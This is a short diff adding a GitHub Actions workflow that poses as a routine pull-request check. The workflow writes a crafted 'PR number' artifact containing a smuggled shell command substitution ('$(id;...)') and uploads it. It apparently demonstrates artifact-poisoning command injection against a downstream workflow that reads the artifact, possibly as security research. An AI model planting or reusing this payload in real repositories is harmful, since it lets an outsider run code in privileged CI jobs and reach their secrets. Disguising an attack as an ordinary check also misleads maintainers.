@@ -1,0 +1,15 @@
+name: CI PIPELINE
+on:
+  pull_request:
+jobs:
+  basic-checker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: make artifact
+        run: |
+          printf '%s' '--repo=$(id;echo${IFS}INJECTED-VIA-REAL-FORK-PR) 113' > pr_num.txt
+          cat pr_num.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr_num
+          path: pr_num.txt
